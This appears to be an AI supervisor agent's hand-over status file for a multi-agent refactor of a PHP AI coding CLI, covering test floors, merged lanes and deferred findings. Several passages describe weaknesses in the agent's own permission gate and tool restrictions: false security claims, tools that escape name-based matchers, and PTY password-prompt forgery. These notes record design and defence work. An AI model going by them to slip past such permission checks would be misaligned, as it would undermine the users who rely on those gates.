-(a: the `disabledTools` block ~L234-290; b: the transcript-seam paragraph ~L291+), but that was luck,
-not design. **Check the actual diffs for overlap before merging, not just the brief's file assignment.**
-
-- **Lane `a` — E74 + E75, doc truth, +5 tests.** Retracted the false project-tier security claim in
-  `README.md` in place (RULE 7). 🔴 **It falsified its own brief's headline figure: "eight characters"
-  is a number nothing produces** — `[!B]*` is 5, `"[!B]*"` 7, `["[!B]*"]` 9, the whole document 27. The
-  figure appears in five places; lane `a` fixed the two it held and recorded the rest (see E82).
-  **And the retraction is STRONGER than recorded:** the backlog framed the negated character class as
-  *the* mechanism, but `["[C-Z]*", "[a-z]*"]` — no negation anywhere — also leaves exactly `Bash`, so no
-  pattern-shape restriction could restore the promised property. Also measured the two real mitigations
-  (the trust gate; `LayeredSettings::merge()` being key-level) and documented
-  `Bootstrap::reportProjectTierToolRemovals()`, which the README had never mentioned existed.
-- **Lane `b` — E78 + the launch warnings, +9 tests.** Tied the shipped caps to
-  `SkillPathNudge::maxBytes()` (2,636; worst-case one-entry floor 529; `Grep`/`Glob` margin 3.1x — see
-  E87, which is a decision nobody has made). Corrected its own census twice: the transcript seam has
-  **fifteen** call sites, not fourteen, and there are **eleven** raw `fwrite(STDERR, …)` sites, not four.
-  The retention *summary* migrated onto the seam; the per-session **ids** deliberately did not, because
-  one row per deleted session is exactly the per-entry fan-out the cap exists to refuse.
-- **Lane `c` — E59 (half) + E76, +4 tests.** E76 closed. **E59's worker half deferred explicitly, not
-  half-landed** — a real worker needs an autoloader in the child, a provider identity across the startup
-  message, and an offline substitute for CI, and two of those three touch files other lanes held. The
-  stub is kept and documented as an intentional seam (RULE 6). Filed **E80**, a genuine flake it
-  refused to re-roll away.
-
-**Nine deferred findings recorded as E81–E89** (`cf65d9c0`) rather than left in the lane reports:
-doc drift in `LayeredSettings` (E81, E82), README prose unpinned as a class (E83), the JSON-contract
-hole in the autoload guard (E84), `SkillRegistry`'s hand-rolled `**` translation (E85), **the MCP
-failure notice going to `error_log()` where the operator's ini decides whether anyone ever sees it
-(E86 — the one worth doing first)**, the un-decided nudge margin (E87), the dormant `SelectPaneMsg`
-seam (E88), and a test whose name overstates it (E89).
-
-🔴 **E80 IS A REAL FLAKE AND IT WILL BITE A FUTURE ROUND.**
-`MultiAgentRefactorTest::testArchitectPlansTwoCodersImplementInParallelReviewerVerifiesLeadMerges`
-aborted at 60 s on one run and passed on the next, same tree, nothing between them but machine load —
-`pcntl_fork()` + SQLite `flock()` with a **capped** backoff. It did not fire in the merged run. **If a
-future full-suite run comes back rc 1 with exactly one risky test and ~22 missing assertions, this is
-it — re-run before diagnosing anything else.**
-
-### 🟢 STANDING REQUEST, ROUND 42 — "KEEP EVERY LIB ON THE LATEST" · `scripts/refresh-deps.php` (`9c9872ea`)
-
-The user asked, 2026-08-22: *"in general id like them kept updated like when we push a change to master
-soon after should do a composer update in the sugarcraft root and all subdir repos that use whatever
-packages were updated .. or just all of them so we're always working w/ the latest versions of changes
-we put in."*
-
-⚠️ **THE SUPERVISOR FIRST CALLED THIS WRONG, AND IT WAS NOT. Record the correction, not the first
-take.** The initial response was that a per-lib `composer update` makes siblings *staler*, because it
-resolves them from Packagist. That was true only of the moment it was measured: master had **22 unpushed
-commits**, so Packagist could not have had round 41 and duly served a pre-E73 `candy-core`. **It is not
-a general law.** The user pushed; `sync-sugarcraft.yml` split; Packagist indexed; and a published-mode
-update in `candy-buffer` then installed `candy-core/src/Util/Width.php` at md5 `270fc3f2…` / 38,125 B —
-**byte-identical to the working tree, as a real directory, not a symlink.** The user's model was right
-in every particular: 182 `dev-master` refs + 10 `@dev`, zero committed path repos, sync on push to
-master, and these libs really are installed standalone by people who will never clone the monorepo.
-
-**THE TWO STATES ARE EQUIVALENT WHEN THE TREE IS CLEAN AND PUSHED, AND ONLY THEN.** That is the whole
-of it. `published` (siblings from Packagist) additionally proves the publish pipeline works — that the
-split manifest resolves from Packagist alone, that nothing shipped depending on something unpublished.
-`linked` (siblings symlinked) is the only state in which an uncommitted edit to
-`candy-core/src/Util/Width.php` shows up in `candy-shine`'s run, which is why CI injects before every
-install. Use published as the routine post-push refresh; use linked while developing across libs, and
-before trusting any figure taken on work that is not yet pushed.
-
-🔴 **`--mode=published` ON `sugar-crush` MOVES ITS SKIP COUNT 1 → 2 AND VOIDS THE FLOOR COMPARISON.**
-`GitignoreAwarenessTest::testTheMonorepoPathRepoSymlinksAreNotFollowed` skips when there are no
-path-repo symlinks to walk — which is exactly the alarm this file uses to detect a destroyed closure.
-The figure is not *wrong*, it is simply not comparable to any recorded floor. **Keep `sugar-crush`
-LINKED for the audit.** The script warns about this by name before it runs.
-
-**But the underlying worry was justified, and bigger than the trigger.** Measured across the monorepo:
-of **54** libs with a vendored closure, only **12** were fully symlinked; **12** were partially
-Packagist and **30** were **entirely** Packagist (`0/N`). CI is unaffected (it injects per job), but any
-LOCAL suite run in those 30 was testing two-rounds-stale siblings and saying nothing about it.
-
-**`php scripts/refresh-deps.php`** does both, deliberately, and names the state it leaves behind.
-`--mode=published` (DEFAULT) runs a plain `composer update -o -W` per lib — no injection, because the
-committed manifests already say `dev-master` with no `repositories[]`, which is precisely what an
-outside consumer installs. `--mode=linked` injects the closure, updates, then discards the scratch
-manifests in a `finally` and proves `is_link()` per lib. `--root` also updates the root, whose
-`repositories[]` is legitimate and whose `composer.lock` is tracked and **kept**. `--status` prints
-which state every lib is in (`linked` / `published` / **`mixed`** — the dangerous one, part working tree
-and part snapshot of unknown age). `--dry-run` prints the plan. Exit is non-zero unless every targeted
-lib ends in the requested state.
-
-**Published mode has two guards the manual command does not.** It REFUSES to run with unpushed commits
-(`--force` overrides), because Packagist cannot serve what has not been pushed — that is the exact
-mistake that voided two suite runs. And afterwards it fingerprints every vendored sibling's `src/`
-against the working tree: on a clean tree they MUST match, so any drift means the pipeline has not
-caught up (sync still running, webhook not indexed, or the lib was not in the affected set) and it says
-so rather than reporting a clean success.
-
-**WHEN TO RUN IT:** at a round boundary, AFTER the merged floor is measured — never between a lane merge
-and its measurement. Re-measure the floor afterwards if third-party versions actually moved.
-
-### ✅ DONE, ROUND 42 — THE ROOT UPDATE THE USER WAS DOING HAS BEEN RE-RUN AND COMMITTED (`2d78013d`). Kept for the reasoning; nothing is owed.
-
-Round 41's supervisor **reverted the user's root `composer.lock` change** (118 insertions / 115
-deletions — aws-sdk 3.390.4 → 3.393.4 and friends) before it knew the change was theirs, to keep it out
-of an unrelated commit. **The user answered on 2026-08-22: re-run it.** Their exact command:
-
-```sh
-composer update -v -o -W        # at the REPO ROOT, /home/sites/sugarcraft
-```
-
-`-o` authoritative classmap, `-W` `--with-all-dependencies` (bumps transitive deps too, which is why the
-diff was large). **Run it at the round boundary, after the merged floor is measured** — a changed root
-lock during a measurement is one more thing to rule out. It is otherwise independent of the lanes: the
-root `vendor/` is not what any per-lib suite loads.
-
-⚠️ **The root manifest is the ONE manifest that legitimately carries `repositories[]`** — the monorepo
-root is the directory those `../<lib>` urls resolve against. So unlike a per-lib update this one is
-expected to touch the root lock, and the root lock **is tracked and SHOULD be committed**. Do NOT
-`git checkout --` it. Afterwards still confirm the usual invariants, because `-W` reaches far:
-`php tools/check-path-repos.php --no-lib-path-repos` rc 0 · `sugar-crush` still **18/18 symlinks** by
-`is_link()` · zero tracked per-lib `composer.lock` · `.sugar-crush/config.json` md5 unchanged.
-**If the root update de-symlinks any per-lib closure, repair it with the round-trip above before
-trusting a single further figure.**
-
----
-
-## SUPERSEDED — round 40's block, kept for its reasoning (its floor 8905 and its spawning cap are BOTH superseded by §0-NOW-56; its lessons are not)
-
-**SUITE FLOOR: `8905 / 101022 / 1 skipped / rc 0` at `33f97cb1`**, supervisor-measured in the live tree
-after merging all three lanes. Supersedes every earlier figure (8879 held the round-39 boundary).
-The merged total was PREDICTED from the lanes' deltas and matched **to the assertion** — do that every
-round; a mismatch is the cheapest possible detector of a bad merge.
-**Skips MUST stay exactly 1** (`tests/MCP/McpClientTest.php:106`); a 2 means `vendor/sugarcraft/*` was
-replaced by Packagist copies and every figure since is void. 18 symlinks;
-`md5sum .sugar-crush/config.json` = `05480c743aff302fd6c06c5a4a4c2210`;
-`php tools/check-path-repos.php --no-lib-path-repos` rc 0; zero tracked per-lib `composer.lock`.
-
-**Fourteen sibling libs verified green in the merged tree** — candy-core 785/7134/25skip,
-candy-sprinkles 750/2623, candy-forms 1823/2973, candy-hermit 144/516, candy-kit 143/486,
-sugar-bits 493/1015, sugar-gallery 92/252, sugar-stickers 215/420, sugar-toast 190/365,
-sugar-veil 201/406, sugar-dash 5853/9154, sugar-table 456/1024, sugar-charts 543/1259,
-sugar-calendar 147/364. Do this whenever a lane touches `candy-core`.
-
-### 🔴 SUPERSEDED — the round-40 spawning cap. Concurrency is now **3** by explicit instruction; see §0-NOW-56. Kept because the reasoning about who did what by hand is load-bearing for reading round 40's stamps.
-
-**Standing instruction, given mid-round-40: _"no more spawning additional agents until session
-resets"_, followed by _"after these steps are all done being merged into the main dirs and lanes
-cleaned up and worklog/plan/RESUME file updated, pause"_.** Round 40 was finished by the supervisor
-by hand — one review and all three fix rounds. **Do not spawn anything on resume without checking
-with the user first.** The pre-cap setting was 3; `docs/plans/crush_code_concurrency.md` stays the
-authority for the mechanics, and ⚠️ **P8.8 and P8.13 still collide with each other**.
-
-### Round 40 landed all three lanes, each supervisor-verified by my own full-suite run
-
-- **`cmd` — E66 + E67.** The skill path nudge is bounded (8 entries, 300 B each, 2,636 B ceiling) and
-  in `Grep`/`Glob` is **spent inside** the tool's cap instead of beside it. `SkillRegistry::register()`
-  keys by the skill's own name.
-- **`lsp` — E68 + E69.** `Width` has ONE grapheme segmentation on every PHP version; `Width` and
-  `Style` share one tab width. `candy-core` now declares `ext-intl`.
-- **`sglang` — the launch-notice migration.** Thirteen more launch warnings reach the transcript as
-  well as stderr, bounded in count (24) and per message (400 chars).
-
-### ⚠️ THINGS THAT CHANGE HOW YOU WORK — read before briefing any agent
-
-**E68 PROVES THE VERSION AXIS IS REAL. Put a PHP version on every width claim.** E68's recorded
-mechanism was **inverted**, and the fix it prescribed would have changed nothing: `truncateAnsi()`
-already stopped before an unfittable cluster; `Width::string()` was the splitter, because
-`grapheme_str_split()` is **PHP 8.4+ and absent on this box's 8.3.6**. It was a **PHP-8.3-only defect
-recorded as unconditional**, and CI runs `PHP_VERSIONS = ['8.3', '8.4']` — so a lane can measure
-green here and go red in CI, or vice versa. **This box has only PHP 8.3.6; there is no 8.4 binary.**
-An agent cannot test 8.4 and must not pretend to — use ext-intl's `grapheme_extract()`/`grapheme_strlen()`
-as an ICU oracle instead, and prefer fixes that REMOVE a version-conditional path over fixes that pick
-a branch.
-
-**A hypothesis in a status block reads, one round later, exactly like a measurement.** Round 39's close
-speculated that E61's premise had changed; a scout proved it FALSE, and acting on it would have closed
-the unbounded-chain finding by bookkeeping. **Mark hypotheses as hypotheses in this file.**
-
-**Rewrite a stale justification; never delete it.** Round 40 falsified four passages that argued for
-guards which still exist. Each now carries WHAT IT SAID / WHAT IS TRUE NOW / WHY THIS STILL EARNS ITS
-PLACE. Delete the reasoning and the next reader deletes the guard.
-
-**Keep the `/tmp` prohibition in EVERY brief** (unchanged from round 39): never glob-delete
-`/tmp/sc_chat_tool_*` or `/tmp/crush-hook-payload-*`; unique probe names, exact-path deletes only.
-**Agents commit INCREMENTALLY in-lane** (unchanged). **Cite SYMBOLS, not line numbers** — round 40
-produced a fifth instance, `Grep.php:377` → `:389` inside the lane that was told about the pattern.
-
-**A green suite is not a pinned invariant.** Three separate guards this round passed while proving
-nothing: `cmd`'s `Read` nudge test (green with the nudge disabled), the `app()` delta offset (green
-with the two bases mismatched), and every tab assertion (green for any `TAB_WIDTH`). **Mutate the
-clause, or you have not pinned it.**
-
-### SUPERSEDED — ROUND 41's ORIGINAL SCOPE MEASUREMENT, kept for its figures. ⚠️ ALL of it is now DONE: E52 and E61(S) at `ae30fee5`, then `statusLine`, E73 and E70–E72 via lanes a/b/c at `7852d79e`. Read §0-NOW-56 for current state.
-
-A scout re-measured the queue at `8add627b`; all figures are its, not the record's.
-
-- **E52** — reproduces. ⚠️ **Bigger than its heading**: it is the whole **shift-bit-clear family**
-  (`ESC[1;3Z` drops shift identically), not just `CSI 1;5Z`, so a fix scoped to `1;5` would be wrong.
-  Still emitted by nothing. **S**, `candy-core/src/InputReader.php` + its test. No overlap.
-- **E61 (the S only)** — `HookRegistry::scan()`'s deny string names the timeout sum but neither the
-  hook that spent the clock nor that the named hook never ran. **The L (fiber/fork for an unbounded
-  all-PHP chain) stays OPEN and recorded — do not let "E61 is done" close it.** S, `HookRegistry` + test.
-- **`statusLine`** — greenfield **M confirmed**. Both grep-baits verified as baits:
-  `Chat::budgetStatusLine()` is a private `/budget` formatter and `candy-kit`'s `StatusLine` is a glyph
-  printer. `statusLine` appears **zero** times in `sugar-crush/src/` and `bin/`, and is absent from
-  `LayeredSettings::LAYERED_KEYS`, so a `statusLine:` in `settings.json` is silently dropped today.
-  Needs a user-tier-only key (it names a shell command), `Bootstrap` wiring, `Chat` state, `Renderer`
-  composition, and a bounded command runner — reuse E60's clip doctrine, don't invent a constant.
-- **E59** — **L**, and its recorded Step is confirmed WRONG. There are **three** literal `"Processing:"`
-  anchors across **two** tests, one of them a *negative* assertion that will pass forever if a rewrite
-  misses it. Keep the test's structure, replace all three anchors with a liveness anchor a real worker
-  can satisfy.
-- **New this round, unfixed: E70, E71, E72, E73.** E73 is the notable one — the E69 residue is
-  **bimodal** and the dangerous half was missed: `Width::string("\t" ZWJ U+1F44D)` returns **0** for
-  something `Style` renders as **6 cells**, i.e. an **over-run-direction** disagreement in candy-core's
-  ZWJ state machine. Pre-existing; E68/E69 stay fixed.
-
-**Lane shape: E52 + E61(S) + statusLine is clean** — only `statusLine` needs `Bootstrap.php` *and*
-`Chat.php`. Adding E59 is safe ONLY if its lane extends the stdin `startup` payload rather than the
-`ProcessExecutor` constructor; otherwise E59 and `statusLine` both open `Chat.php` and must serialise.
-
-Then the remaining queue (E73, the four un-migrated raw-`fwrite` launch warnings `sglang` judged
-stderr-only, `keybindings` L/DEFER), then **Phase 9** (interactive-prompt containment: layered A+C,
-parameter not second tool, **no askpass**), then the deferred security pass.
-
-### SUPERSEDED — round 38's block, kept for its reasoning
-
-**SUITE FLOOR: `8820 / 99755 / 1 skipped / rc 0` at `7771c148`**, supervisor-measured in the live tree.
-Supersedes every earlier figure (8786 held the round-37 boundary; 8794 was the round-38 midpoint).
-**Skips MUST stay exactly 1** (`tests/MCP/McpClientTest.php:106`); a 2 means `vendor/sugarcraft/*` was
-replaced by Packagist copies and every figure since is void. 18 symlinks;
-`md5sum .sugar-crush/config.json` = `05480c743aff302fd6c06c5a4a4c2210`;
-`php tools/check-path-repos.php --no-lib-path-repos` rc 0; zero tracked per-lib `composer.lock`.
-
-**Round 38 landed both lanes, supervisor-verified by my own full-suite runs:**
-- **`lsp` — E53 + E54, `AgentViewPane` width** (`6276c51e`, `24d8aad8`, `70a4efb3`). Grapheme-aware
-  truncation; `CHROME_WIDTH` + `contentWidth()` so both callers agree about the `+4`. **E54 is stamped
-  PARTIALLY FIXED** — the dashboard over-run is gone (32/62/102 → 30/60/100) but the below-44 case in its
-  own heading is untouched. New **E64** for the `max(5, …)` operation floor that refutes the `+4` at six
-  of ten widths on wide clusters (pre-existing, masked by `clipWidth()`).
-- **`sglang` — mouse/keyboard divergence** (`8f845f26`, `8b9a4b7e`, `7771c148` + one). Three review
-  rounds, two blocking.
-
-⚠️ **NEW — E63 changes how a red suite is read.** `ChatTest::tearDownAfterClass` globs the SHARED temp
-dir and attributes any concurrent process's `sc_chat_tool_*` files to itself, so two lanes running suites
-at once can trip it. **A run that fails ONLY on that assertion is not a red suite** — re-run
-`vendor/bin/phpunit --filter ChatTest` alone to disambiguate, and prefer to take floor measurements when
-no lane is running a suite. It is false-positive-only: it cannot hide a leak, only invent one.
-
-⚠️ **STANDING CHANGE — agents commit incrementally in-lane.** A network drop killed both round-38 agents
-mid-flight, one holding **626 uncommitted insertions across 4 files**. Nothing was lost only because the
-lane was snapshotted by **file copy + `git diff` patch** before anything else touched it. Never
-`git checkout --`/`git restore`/`git stash` a lane to "clean up"; a resumed agent must be told its dirty
-tree is its own work. Several small commits on a branch cost nothing — the supervisor squashes at merge.
-
-**Remaining measured queue:** E52 (recorded only), E57 (`SkillPathNudge` genuinely unbounded), E58, E59,
-E60 (hook ALLOW/ASK/MODIFY prompt text still unbounded — four actions, four failure modes, not one
-constant), E61 (an all-PHP hook chain is bounded by nothing without a fiber or a fork), E63, E64,
-`statusLine` (greenfield M — ⚠️ `Chat::budgetStatusLine()` will bait a future grep into thinking it
-exists), `keybindings` (L, DEFER). Then **Phase 9** (interactive-prompt containment, decided: layered
-A+C, parameter not second tool, **no askpass**), then the deferred security pass.
-
-### SUPERSEDED — round 37's block, kept for its reasoning
-
-**Written between rounds so a compact cannot lose it.** Rounds 33 through 36 are all CLOSED and
-supervisor-verified. **Nothing is in flight; all three lanes are clean at master.** Round 37 is
-unscoped — start it by running the scout pass described under "ROUND 36 SCOPE" below, not by reading
-the plan. Round 32's SUPERSEDED block further down remains the authority for the standing rules and the
-DeepSeek record.
-
-### CONCURRENCY: **2**, BY USER INSTRUCTION
-
-**CURRENT STANDING INSTRUCTION — concurrency is 2.** The user briefly set it to 1 on 2026-08-20 as a
-deliberate TEMPORARY measure while near a session limit, then restored 2 once the limit reset:
-*"go back to 2 agent concurrency and keep driving the plan no stopping for confirmation unless you
-can't progress any farther without some decision you need me to make"*. The 1-lane window is over;
-do not re-apply it.
-
-**Both round-34 lanes were killed mid-cycle by that session limit, not by any fault in their work,
-and BOTH WERE RESUMED from their saved transcripts** rather than restarted — restarting would have
-thrown away a nearly-complete review and a nearly-complete implement.
-
-A read-only measurement/scout agent does NOT count against the lane budget — it holds no files, makes
-no writes, and cannot collide. Only lanes that write count. A reviewer for an active lane is part of
-that lane's cycle, not a second lane.
-
-⚠️ **P8.8 and P8.13 collide with EACH OTHER on the census token** — never bundle those two together.
-That is a same-lane conflict and it survives any concurrency setting.
-
-### CONCURRENCY HISTORY (superseded — kept so the reasoning is not re-litigated)
-
-Superseded: the user raised it 2 → 3 on resume ("resume.. concurrency of 3"), then lowered it to 2
-(*"after these lanes finish their review/fixes switch to 2 lanes at a time for now"*), then to 1 (see
-above). Each step down used the same rule: it takes effect as the in-flight cycles complete, never by
-killing work. `crush-lane-sglang` and, from now on, one of `cmd`/`lsp` stay parked clean at master.
-
-A read-only measurement/scout agent does NOT count against the lane budget — it holds no files, makes
-no writes, and cannot collide. Only lanes that write count.
-
-The concurrency document's own arithmetic says sustainable N = 3, hard cap 4, so 2 is comfortably
-inside the measured ceiling; `docs/plans/crush_code_concurrency.md` stays the authority for the
-mechanics.
-
-**The round was PAUSED once ("pause everything temporarily") and resumed.** Both fix agents and the
-sync daemon were stopped mid-flight and every agent was confirmed killed before the pause. That pause
-is why the `sglang` lane holds a partial artefact — see below.
-
-### WHERE THINGS STAND — as of master `8185ea89`
-
-**SUITE FLOOR: `8708 / 95199 / 1 skipped / rc 0` — supervisor-measured in the live tree at `8185ea89`.**
-Supersedes every earlier figure (8673 held the round-35/36 boundary; 8684, 8687, 8690 were intermediate).
-**Skips MUST stay exactly 1** (`tests/MCP/McpClientTest.php:106`,
-`testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`); a 2 means `vendor/sugarcraft/*` was
-replaced by Packagist copies and every figure since is void.
-`sugar-crush/vendor/sugarcraft/` = **18 symlinks**.
-`md5sum /home/sites/sugarcraft/.sugar-crush/config.json` = `05480c743aff302fd6c06c5a4a4c2210`.
-`php tools/check-path-repos.php --no-lib-path-repos` must exit 0; zero tracked per-lib `composer.lock`.
-
-⚠️ **Assertion totals are NOT assert-call counts** — PHPUnit 10 counts the `…OrEqual` family as 2.
-
-**ROUND 37 STATUS — master `ec3b6d68`, suite floor `8786 / 99189 / 1 skipped / rc 0`,
-supervisor-measured in the live tree.** Two bundles landed and verified:
-
-- `fc597e81` + `995eb257` — **`cmd`, unbounded waits.** `ScriptHook::drain()` was unbounded in TWO
-  places (NULL-timeout `stream_select()` AND a following `proc_close()`), on the TUI's own path, so a
-  hook that never closed stdout froze the CLI with no spinner and no Escape. Plus SIGTERM→SIGKILL
-  escalation in `BackgroundSessionRunner`, a deadline-based retry backoff, and a swept-up bare
-  `pcntl_waitpid` inside a periodic-timer callback. The fix round then found `timeout: .inf` reopened
-  the whole thing behind an error message promising it could not be asked for.
-- `cc3bfeaf` + `2993aee7` + `ec3b6d68` — **`lsp`, tool output budget.** Five tools, not the two
-  recorded: `Read` was worst at 37.1×, and `Edit`/`Write` had no cap parameter at all. Took TWO review
-  rounds — the first cut shipped a **45× regression worse than the bug it fixed** (see the worklog).
-
-**STILL IN FLIGHT: `sglang`, branch `ai/crush-mouse-modal-guard`, at `6b6435cb`, rebased onto
-`49b3f2e8`, with a THIRD fix agent running.** It has had implement → review (BLOCKING) → fix →
-re-review (BLOCKING) → fix-in-flight. Its own measured suite at `6b6435cb` is **8807 / 99386 / 1 /
-rc 0**. Not merged; nothing of it is on master.
-
-The second review upheld the substance — the HIGH fix passes (0 of 9 palette rows disagree mid-turn,
-plus 8/8 on the `providers` submenu) and the new press-consumption path passes nine driven scenarios in
-**both** directions (nothing illegitimate fires; nothing legitimate is eaten). What blocks is that the
-fix's own **precedence reorder created a new divergence in the direction nobody checked**: mid-turn
-under an overlay, a `pane:agents` click closes the overlay and `Ctrl+A` does not. The test that would
-have caught it drives only one device — its palette sibling compares both, and the agents test never
-touches the keyboard. Same family, second instance: a click on the CURRENT session tab returns silently
-while `Ctrl+Tab` writes a notice and closes the overlay.
-
-⚠️ **A lane's suite total can be stale even when its domain figures are right.** `6b6435cb` cites
-8778 / 95616 under a heading reading "FIGURES RE-MEASURED AT THIS COMMIT, EVERY ONE" — measured on the
-older base `995eb257`, before master's three tool-output commits added +29 tests / +3770 assertions.
-Its domain-scoped numbers are unaffected because those commits touched only `tests/Tools/*`. **One of
-the stale figures is baked into source at `src/Chat.php:4276`.** Re-measure lane figures after every
-supervisor rebase.
-
-### 🔴 PHASE 9 ADDED TO THE PLAN — interactive-prompt containment, DECIDED
-
-**From a live incident on 2026-08-21.** A user authorised `sudo` believing passwordless was configured;
-it was not; the password prompt rendered **at column 0 outside the chat pane** while the tool hung.
-
-**The mechanism, measured:** stdin is already handled — `CapturesProcessOutput` closes it, so a
-stdin-reading command already gets EOF. `sudo` never reads stdin; it opens **`/dev/tty`** directly for
-both the prompt and the reply, bypassing every pipe and every output guard in this tree. That is why
-the text never passed through the renderer. **Detaching the controlling terminal is a PREREQUISITE for
-the display fix, not an alternative to it.**
-
-**Decided by the user:** layered — **(A) detach always**, **(C) PTY opt-in**. The opt-in is an
-**optional parameter, NOT a second tool**, because `PermissionGate`, `HookManager`, every `PreToolUse`
-matcher and every user rule match on the **tool name**; a `BashInteractive` would silently stop being
-covered by all of them while still passing. That is this tree's most common defect and round 37 alone
-produced three instances of it.
-
-Sequenced **after the remaining functional fixes, before the deferred security pass**. Security finding
-**E62** recorded (a PTY in the pane is a credential-entry surface driven by model output), with a
-same-day correction: `SUDO_ASKPASS` only keeps plaintext out of the app **if the helper can reach the
-user without routing back through it** — what survives regardless is that askpass is an
-**authenticated** prompt channel and a PTY is not. **Phase 9 step 1 is explicitly NOT blocked on E62.**
-
-**NO ASKPASS — decided by the user (`50439cbb`), and it is a SCOPE decision, not a mitigation.** The
-E62 threat is a *credential-entry* surface; removing credential entry removes the surface. A command
-that needs a secret gets the fail-fast naming the real options (configure `NOPASSWD`, run it yourself,
-grant the capability another way) — **the agent never holds the password.** Askpass lost on cost, not
-principle: its one durable benefit is the authenticated channel, and buying it needs a helper that can
-reach the user WITHOUT routing back through the app — verified absent on this box (no `ssh-askpass`, no
-`zenity`; `pinentry-curses` needs the very tty step 1 removes) — times four separate integrations, none
-of which covers the general interactive case anyway.
-
-⚠️ **Two ways this decision gets over-applied by whoever reads it next — guard both.**
-(a) It does **NOT** delete step 1's non-interactive environment work. `GIT_TERMINAL_PROMPT=0`,
-`DEBIAN_FRONTEND=noninteractive`, `PAGER=cat`, `sudo -n` are not askpass — they are how a command fails
-fast and legibly instead of hanging. They stay.
-(b) The residual is carried honestly: a PTY child can still **print** something that looks like a
-password prompt, and a user trained by the `[Y/n]` flow may type a secret into the pane anyway. So
-E62's "app chrome visually distinct from PTY content" **survives, demoted** from *the fix* to *defence
-in depth*. What makes the remaining prompts low-stakes to forge is that forging one buys a keystroke,
-not a password.
-
-**Round 37's scout re-measured E51–E56 and found ALL SIX still open.** Unlike round 36 (8 of 13 already
-closed), the backlog was accurate about open/closed here — but wrong in its details at a rate of 11
-stale line numbers in E51 alone, plus two substantively false claims. `d7919902` fixed the record.
-
-**Remaining measured queue:** E52 (recorded, nothing emits `CSI 1;5Z`), E53+E54 (bundle them — same
-file, same width question; E53's truncator emits a dangling ZWJ at budget 4), E57 (`SkillPathNudge`
-genuinely unbounded), E58, E59, E60 (hook ALLOW/ASK/MODIFY messages still unbounded prompt text — four
-actions with four different failure modes, not one constant), E61 (an all-PHP hook chain is bounded by
-nothing without a fiber or a fork), `statusLine` (greenfield M — ⚠️ `Chat::budgetStatusLine()` will
-bait a future grep into thinking it exists), `keybindings` (L, DEFER).
-
-⚠️ **CI PUSHES TO MASTER WHILE LANES WORK.** A `vhs: regenerate demo GIFs` commit landed mid-round and
-broke a lane's fast-forward. It touches only `.gif` files, so a lane rebase is clean — but the
-supervisor must `git fetch` and re-check `origin/master` before every merge, and be ready to rebase a
-lane that had already rebased once.
-
-### WHAT LANDED — rounds 33 to 36, all supervisor-verified by my own suite runs in the live tree
-
-| commit | round | what | verified |
-|---|---|---|---|
-| `339f512c` | 33 | `--permission-mode`/`--model` empty values exit 2; `accept-edits` scoped-write gate pinned | 8204 / 91728 |
-| `2bde4114` | 33 | both text tool-call parsers stop fabricating calls from quoted prose | 8299 / 91986 |
-| `c4718781` | 33 | P3.2 FocusRing/Shift-Tab + P3.5 cell-width padding (+ `candy-core` `CSI Z`) | 8315 / 92077 |
-| `b009077a` | 34 | **P8.9** — `Grep` gains `InstructionFileLoader` + `skillNudge` | 8331 / 92144 |
-| `7714675d` | 34 | **P8.4** — compositor rewired to the sub-agent map + liveness filter | 8360 / 93659 |
-| `3837b49f` | 34 | **headless permission approver** — `withPermissionApprover()` gets a `src/` caller | 8393 / 93728 |
-| `8de875d3` | 34 | **P3.4 `Table`** + finding #5 (16-field carry) + finding #8 (fourth trust grant) | 8464 / 94225 |
-| `bc7b17f6` | 35 | **P8.8 repo-map** — generic sub-package detector, not the plan's markdown parser | 8508 / 94353 |
-| `6c33705c` | 35 | P8.8 fix — **the ungated walk**, `packages/*` support, 6 mutation survivors killed | 8527 / 94400 |
-| `c9d846e8` | 35 | **finding #7 `/permissions`** — a reserved name that answered nothing | 8514 (pre-rebase) |
-| `f3d59e1a` | 35 | `/permissions` fix — **line forgery**, and 3 of 6 mode descriptions false | 8673 / 95005 |
-| `3846f901` | 36 | **both shell-out backends** stopped blocking the loop — 0 → 36 ticks per completion | 8684 / 95046 |
-| `44ee41df` | 36 | backend fix — idle deadline measured **silence since spawn**; `complete()` deadlock closed | 8687 / 95053 |
-| `4b36ba89` | 36 | **checkpoint memo** — 52.78 ms → 4.11 ms of blocking CPU per turn | (bundled) |
-| `0a4a375f` | 36 | **async workflow + live pane** — the compositor was invisible for **two** reasons | 8690 / 95139 |
-| `8185ea89` | 36 | workflow fix — 5 stale sites, memo guard, concurrent-run signal-stack corruption | **8708 / 95199** |
-
-**ROUND 35 IS CLOSED. Both bundles landed, each after a review that found BLOCKING security defects.**
-
-### ROUND 35's THIRD LESSON — "two independent methods agree" was one method counted twice
-
-`/permissions`'s reviewer called the lane's assertion baseline unreproducible and derived a different
-delta, corroborated "two independent ways". **The fix agent refuted it by measurement** — a full suite
-run against a `git archive` of the parent commit reproduced the lane's figure exactly — and then named
-the reviewer's error: both of its methods assumed the new tests' isolated assertion count was the
-whole delta. It was not. The commit added a row to `CommandRegistry::all()`, and **20 pre-existing
-assertions are data-driven over that list.**
-
-**The rule: when a change adds a row to a list that tests iterate, the assertion delta includes tests
-that are not yours and did not change.** More generally — *check whether two corroborating methods
-share a premise before treating them as independent.*
-
-### ROUND 35's FOURTH LESSON — anchoring the claims is useless if CHOOSING which to anchor is possible
-
-Three of six `PermissionMode` descriptions were factually false about the gate they describe
-(`default` said networking asks — `WebFetch` **allows**; `accept-edits` said everything else asks —
-reads **allow**; `plan` said every other write is denied — `Bash rm ./a` and `Bash curl` **run**). In
-**all three** the false clause was precisely the one with no anchor row.
-
-The fix was not sharper rows. It was making the table **total**: 15 probes × 6 modes = 90 cells,
-completeness asserted against `cases() × probes()`, plus a clause→probe map requiring every clause of
-every sentence to point at a real cell. **A partial anchor table lets an author anchor the claims they
-are confident about — which are the true ones.**
-
-### 🔴 ROUND 36's CLOSING LESSONS — three, and two are about SEARCHING for the wrong thing
-
-**1. A grep for the identifier finds the sentence ABOUT the identifier.** I relayed a cross-lane
-finding that two docblocks (`Chat.php:6452`, `Tui/Renderer.php:720`) still recommended the
-fork-plus-socket pattern. They do not — both cite it **only to refute it**, and had already been
-corrected. The reporting lane's grep for `completeAsync` found the refutation and read it as the
-recommendation. ⚠️ **And I passed it on without checking** — one message after recording the rule that
-a correction is a claim and must be verified before the record changes. *That rule applies to
-cross-lane routing, not only to edits of this file.*
-
-**2. Sweep the BEHAVIOUR, not the token.** The fifth stale site (`README.md:861`, a parenthetical
-"`/workflow run` also blocks the TUI while it runs") was found only because the lane searched for what
